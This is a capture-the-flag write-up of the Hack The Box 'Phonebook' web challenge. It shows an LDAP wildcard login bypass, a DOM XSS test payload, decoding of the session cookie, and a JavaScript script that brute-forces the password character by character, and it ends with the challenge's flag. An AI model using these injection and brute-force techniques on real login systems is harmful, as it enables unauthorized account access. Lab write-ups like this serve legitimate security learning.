# Phonebook
> Write-up author: jon-brandy
## DESCRIPTION:
Who is lucky enough to be included in the phonebook?
## HINT:
- NONE
## STEPS:
1. First, open the host given.

> RESULT

![image](https://user-images.githubusercontent.com/70703371/208025059-aa52ae7a-77bd-4517-949c-1299389c3515.png)

2. Let's try to enter the username as `admin` and the password as `admin`.

> RESULT

![image](https://user-images.githubusercontent.com/70703371/208025202-d56d1c9f-d864-4e4a-9f9d-ba8bf19d7f18.png)


3. Yeah obviously we failed, but notice at the url parameter.
4. The message parameter has `Authentication failed` as the value.

![image](https://user-images.githubusercontent.com/70703371/208025396-88d42c54-31e6-42fb-9dc0-5241a1dafe13.png)


5. Also there's a note from Reese:

![image](https://user-images.githubusercontent.com/70703371/208025598-3c03e023-b1bb-4768-a2db-184f9b51fb7f.png)


6. After did several SQLi command, i found that when i entered both username and password as `*`. We successfully logged in! With this we know that the website is using LDAP Authentication. We can utilize that to bruteforce the website.

> LOGGED IN


![image](https://user-images.githubusercontent.com/70703371/208936585-62d4177c-707c-4470-8e20-851567f67fb2.png)


7. Let's check for `Reese`.

> RESULT

![image](https://user-images.githubusercontent.com/70703371/208937586-429c5925-2e95-4692-964f-6551f45df490.png)


8. Well got no clue.
9. Let's go back to the login page.
10. I tried to change the message parameter.

> RESULT

![image](https://user-images.githubusercontent.com/70703371/208938935-a6702a0b-07e3-4d69-8a69-64a821b40c69.png)



11. It changed, maybe it's related to **XSS** (?)
12. When i entered a simple xss payload, we got nothing.
13. But when i tried to enter xss with the <img> tag. Got this result:

```
<img src/onerror=prompt(8)>
```

> RESULT

![image](https://user-images.githubusercontent.com/70703371/208939632-5363988c-7ec4-427e-94e1-a3c1fc4ef20f.png)


14. Great we can conclude that the website is vulnerable to XSS.
15. And the type of XSS is DOM XSS, means the vulnerability exists in client-side code.

![image](https://user-images.githubusercontent.com/70703371/208940055-df448d9f-e438-4353-b200-57f8160c96e6.png)


16. Now how to get the correct username?? I think it's a luck, when i tried to see the cookies after i logged in using `*` as username and pass.

> COOKIE

```
MTY3MTYzNjczNnxEdi1CQkFFQ180SUFBUkFCRUFBQUpfLUNBQUVHYzNSeWFXNW5EQW9BQ0dGMWRHaDFjMlZ5Qm5OMGNtbHVad3dIQUFWeVpXVnpaUT09fNLEZJsY2tV2A42nzGyxDgQtIvKJZR37B0b69fpdZvbf
```

17. Then i pasted it on cyberchef.

> RESULT

![image](https://user-images.githubusercontent.com/70703371/208943332-860aed9e-39b3-42dd-983b-3b6d00c217ca.png)


18. Decode the **base64** text.

```
Dv-BBAEC_4IAARABEAAAJ_-CAAEGc3RyaW5nDAoACGF1dGh1c2VyBnN0cmluZwwHAAVyZWVzZQ==
```

> RESULT

![image](https://user-images.githubusercontent.com/70703371/208943919-a9f8faa2-32dc-4dfd-a3e8-b49d8d43e670.png)


19. Guessing the username as `reese`.
20. Then bruteforce the password using javascript.

> THE SCRIPT

```js
function getFlag()
{
    //console.clear();
    var strings = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_' // alphabets to check
    var i, flag, req; 
    for (i = 0; i < strings.length; i++) // as long as i lower than the length of strings
    {
        flag = 'HTB{' + localStorage.getItem('flag') + strings[i] + '*}'; 
        req = new XMLHttpRequest();
        req.open('POST', location.href, false);
        req.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
        req.send('username=reese&password=' + flag); // Username as reese and pass as flag*

        if (req.responseURL.split('message')[1] === undefined)
        {
            localStorage.setItem('flag', localStorage.getItem('flag') + strings[i]);
        }

        console.clear(); // clear the terminal 
        console.log('HTB{' + localStorage.getItem('flag') + '}'); // concate the flag with HTB prefix -> HTB{ but without the asterisk
    }
}

var i;
for(i = 0; i < 10; i++) // iterate the func 10 times (in case the flag we got is incomplete, then increment the iteration)
{
    getFlag();
}
```

21. Before run the script, open the localStorage then add a key named `flag` and leave the value blank.
22. Now run the script at the console.

> RESULT

![image](https://user-images.githubusercontent.com/70703371/208953908-aaa1a699-f823-404d-80fd-161c71d4ebed.png)


23. When i input the flag as answers, it turned green.
24. Means we got the correct flag!


## FLAG

```
HTB{d1rectory_h4xx0r_is_k00l}
```

## LEARNING REFERENCES:

```
https://ldap.com/
https://www.varonis.com/blog/the-difference-between-active-directory-and-ldap
```

